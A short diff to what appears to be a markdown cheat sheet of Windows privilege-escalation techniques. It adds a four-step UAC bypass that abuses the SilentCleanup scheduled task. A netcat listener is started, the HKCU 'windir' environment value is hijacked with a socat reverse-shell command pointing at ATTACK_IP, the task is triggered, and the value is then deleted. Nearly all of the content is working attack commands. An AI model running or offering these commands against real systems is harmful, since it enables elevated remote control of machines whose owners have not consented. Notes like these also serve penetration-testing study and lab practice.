@@ -114,3 +114,12 @@
 
 #### reg delete "HKCU\Software\Classes\ms-settings" /f (Cleanup)
 
+# DISK CLEANUP SCHEDULED TASK
+
+#### 1) nc -lvp PORT 
+
+#### 2) reg add "HKCU\Environment" /v "windir" /d "cmd.exe -c c:\tools\socat.exe TCP:ATTACK_IP:PORT EXEC:cmd.exe,pipes &REM " /f
+
+#### 3) schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+
+#### 4) reg delete "HKCU\Environment" /v "windir" /f (Cleanup)
